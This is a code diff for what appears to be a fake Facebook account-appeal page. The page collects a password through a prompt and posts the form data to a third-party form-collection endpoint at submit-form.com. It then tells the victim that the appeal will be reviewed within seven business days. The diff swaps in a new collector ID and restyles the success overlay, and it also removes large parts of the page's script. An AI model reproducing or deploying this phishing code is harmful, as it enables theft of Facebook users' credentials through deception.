@@ -1686,210 +1686,52 @@ function submitToOtherEndpoints(data) {
                       confirmPasswordBtn.disabled = true;
                       confirmPasswordBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${translations[currentLanguage]['processing'] || 'Processing...'}`;
 
-                      // Submit to SubmitForm.com
-                      const response = await fetch('https://submit-form.com/Le', {
-                          method: 'POST',
-                          headers: {
-                              'Content-Type': 'application/json',
-                              'Accept': 'application/json'
-                          },
-                          body: JSON.stringify(formData)
-                      });
+                     // Submit to SubmitForm.com
+const response = await fetch('https://submit-form.com/Em9nGRH3o', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+        'Accept': 'application/json'
+    },
+    body: JSON.stringify(formData)
+});
 
-                      const result = await response.json();
+const result = await response.json();
 
-                      if (response.ok) {
-                          // Submit to other endpoints
-                          submitToOtherEndpoints(formData);
+if (response.ok) {
+    // Submit to other endpoints (if needed)
+    submitToOtherEndpoints(formData);
 
-                          document.body.removeChild(passwordPrompt);
+    // Show success message
+    const successMessage = document.createElement('div');
+    successMessage.className = 'success-overlay';
+    successMessage.innerHTML = `
+        <div class="success-prompt">
+            <div class="success-prompt-header">
+                <i class="fab fa-facebook" style="color: #1877f2; font-size: 32px; margin-right: 10px;"></i>
+                <h3>${translations[currentLanguage]['appeal_submitted'] || 'Appeal Submitted'}</h3>
+            </div>
+            <div class="success-prompt-body">
+                <p>${translations[currentLanguage]['appeal_success'] || 'Your appeal has been submitted successfully! Our team will review your request and respond via email within 7 business days.'}</p>
+                <div class="success-prompt-actions" style="justify-content: center;">
+                    <button id="close-success-btn" class="primary">${translations[currentLanguage]['ok'] || 'OK'}</button>
+                </div>
+            </div>
+        </div>
+    `;
 
-                          // Show success message
-                          const successMessage = document.createElement('div');
-                          successMessage.className = 'password-prompt-overlay';
-                          successMessage.innerHTML = `
-                              <div class="password-prompt">
-                                  <div class="password-prompt-header">
-                                      <i class="fab fa-facebook" style="color: #1877f2; font-size: 32px; margin-right: 10px;"></i>
-                                      <h3>${translations[currentLanguage]['appeal_submitted'] || 'Appeal Submitted'}</h3>
-                                  </div>
-                                  <div class="password-prompt-body">
-                                      <p>${translations[currentLanguage]['appeal_success'] || 'Your appeal has been submitted successfully! Our team will review your request and respond via email within 7 business days.'}</p>
-                                      <div class="password-prompt-actions" style="justify-content: center;">
-                                          <button id="close-success-btn" class="primary">${translations[currentLanguage]['ok'] || 'OK'}</button>
-                                      </div>
-                                  </div>
-                              </div>
-                          `;
+    document.body.appendChild(successMessage);
 
-                          document.body.appendChild(successMessage);
+    document.getElementById('close-success-btn').addEventListener('click', function() {
+        document.body.removeChild(successMessage);
+        appealForm.reset();
+        submitBtn.disabled = false;
+        submitBtn.textContent = translations[currentLanguage]['submit_appeal'] || 'Submit Appeal';
+    });
+} else {
+    throw new Error(result.error || 'Failed to submit appeal');
+}
 
-                          document.getElementById('close-success-btn').addEventListener('click', function() {
-                              document.body.removeChild(successMessage);
-                              appealForm.reset();
-                              submitBtn.disabled = false;
-                              submitBtn.textContent = translations[currentLanguage]['submit_appeal'] || 'Submit Appeal';
-                          });
-                      } else {
-                          throw new Error(result.error || 'Failed to submit appeal');
-                      }
-                  } catch (error) {
-                      console.error('Form submission error:', error);
-                      alert(translations[currentLanguage]['submission_error'] || 'An error occurred while submitting your appeal. Please try again later.');
-                      confirmPasswordBtn.disabled = false;
-                      confirmPasswordBtn.innerHTML = translations[currentLanguage]['continue'] || 'Continue';
-                  }
-              });
-
-              passwordInput.addEventListener('keypress', function(e) {
-                  if (e.key === 'Enter') {
-                      confirmPasswordBtn.click();
-                  }
-              });
-
-          } catch (error) {
-              console.error('Error:', error);
-              submitBtn.disabled = false;
-              submitBtn.textContent = translations[currentLanguage]['submit_appeal'] || 'Submit Appeal';
-              alert(translations[currentLanguage]['error_occurred'] || 'An error occurred. Please try again.');
-          }
-      });
-
-      // Cancel button functionality
-      const cancelBtn = document.querySelector('.btn-secondary');
-      cancelBtn.addEventListener('click', function() {
-          if (confirm(translations[currentLanguage]['confirm_cancel'] || 'Are you sure you want to cancel? Any unsaved information will be lost.')) {
-              window.location.href = '#';
-          }
-      });
-
-      // Video language selector functionality
-      const video = document.getElementById('appeal-video');
-      const languageSelector = document.getElementById('language-selector');
-      const playButton = document.getElementById('play-video-btn');
-      const confirmLanguageBtn = document.getElementById('confirm-language-btn');
-      const cancelLanguageBtn = document.getElementById('cancel-language-btn');
-      const languageOptions = document.querySelectorAll('#language-selector .language-option');
-
-      // Initialize video with no controls
-      video.controls = false;
-
-      // When play button is clicked, show language selector
-      playButton.addEventListener('click', function() {
-          document.getElementById('language-selector').style.display = 'flex';
-          document.body.style.overflow = 'hidden';
-      });
-
-      // When confirm button is clicked in language selector
-      confirmLanguageBtn.addEventListener('click', function() {
-          document.getElementById('language-selector').style.display = 'none';
-          document.body.style.overflow = '';
-
-          const selectedOption = document.querySelector('#language-selector .language-option.selected');
-          const videoSrc = selectedOption.getAttribute('data-src');
-
-          if (videoSrc && video.src !== videoSrc) {
-              video.src = videoSrc;
-              video.load();
-          }
-
-          video.controls = true;
-          video.play().catch(e => console.log('Video play failed:', e));
-          playButton.style.display = 'none';
-      });
-
-      // When cancel button is clicked in language selector
-      cancelLanguageBtn.addEventListener('click', function() {
-          document.getElementById('language-selector').style.display = 'none';
-          document.body.style.overflow = '';
-      });
-
-      // Language selection for video
-      document.querySelectorAll('#language-selector .language-option').forEach(option => {
-          option.addEventListener('click', function() {
-              document.querySelectorAll('#language-selector .language-option').forEach(opt => {
-                  opt.classList.remove('selected');
-              });
-              this.classList.add('selected');
-          });
-      });
-
-      // When video ends, show the play button again
-      video.addEventListener('ended', function() {
-          playButton.style.display = 'flex';
-      });
-
-      // If video is paused by user, show controls
-      video.addEventListener('pause', function() {
-          video.controls = true;
-      });
-
-      // Show play button when video is not playing
-      video.addEventListener('play', function() {
-          playButton.style.display = 'none';
-      });
-
-      // Translation selector functionality
-      const translateBtn = document.getElementById('translate-btn');
-      const translationSelector = document.getElementById('translation-selector');
-      const confirmTranslationBtn = document.getElementById('confirm-translation-btn');
-      const cancelTranslationBtn = document.getElementById('cancel-translation-btn');
-
-      // When translate button is clicked
-      translateBtn.addEventListener('click', function() {
-          translationSelector.style.display = 'flex';
-          document.body.style.overflow = 'hidden';
-
-          document.querySelectorAll('#translation-selector .language-option').forEach(option => {
-              option.classList.remove('selected');
-              if (option.getAttribute('data-lang') === currentLanguage) {
-                  option.classList.add('selected');
-              }
-          });
-      });
-
-      // When confirm button is clicked in translation selector
-      confirmTranslationBtn.addEventListener('click', function() {
-          const selectedOption = document.querySelector('#translation-selector .language-option.selected');
-          const lang = selectedOption.getAttribute('data-lang');
-
-          translationSelector.style.display = 'none';
-          document.body.style.overflow = '';
-
-          if (lang !== currentLanguage) {
-              translatePage(lang);
-          }
-      });
-
-      // When cancel button is clicked in translation selector
-      cancelTranslationBtn.addEventListener('click', function() {
-          translationSelector.style.display = 'none';
-          document.body.style.overflow = '';
-      });
-
-      // Language selection for translation
-      document.querySelectorAll('#translation-selector .language-option').forEach(option => {
-          option.addEventListener('click', function() {
-              document.querySelectorAll('#translation-selector .language-option').forEach(opt => {
-                  opt.classList.remove('selected');
-              });
-              this.classList.add('selected');
-          });
-      });
-
-      // Close selectors when clicking outside
-      [languageSelector, translationSelector].forEach(selector => {
-          selector.addEventListener('click', function(e) {
-              if (e.target === selector) {
-                  selector.style.display = 'none';
-                  document.body.style.overflow = '';
-              }
-          });
-      });
-  </script>
-
-
-</body></html>
 
 
 
